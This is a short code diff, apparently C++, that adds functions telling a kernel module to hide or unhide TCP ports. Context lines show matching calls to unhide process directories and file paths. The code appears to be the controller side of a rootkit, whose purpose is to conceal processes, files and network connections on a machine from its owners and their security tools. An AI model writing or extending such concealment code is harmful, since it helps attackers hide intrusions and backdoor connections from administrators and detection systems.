@@ -43,6 +43,26 @@ void unhide_process_dir(int pid) {
     unhide_absolute_path(path.c_str());
 }
 
+void hide_tcp_port(PORT port) {
+    msg_to_module msg;
+    memset(&msg, '\x00', sizeof(msg));
+
+    msg.id = OPER_ADD_HIDDEN_TCP_PORT;
+    memcpy(msg.data, (void*) &port, sizeof(PORT));
+
+    kernelAccess.my_send_msg(msg);
+}
+
+void unhide_tcp_port(PORT port) {
+    msg_to_module msg;
+    memset(&msg, '\x00', sizeof(msg));
+
+    msg.id = OPER_REMOVE_HIDDEN_TCP_PORT;
+    memcpy(msg.data, &port, sizeof(PORT));
+
+    kernelAccess.my_send_msg(msg);
+}
+
 void reports_test() {
     size_t i = 0;
     while (i < 20000) {
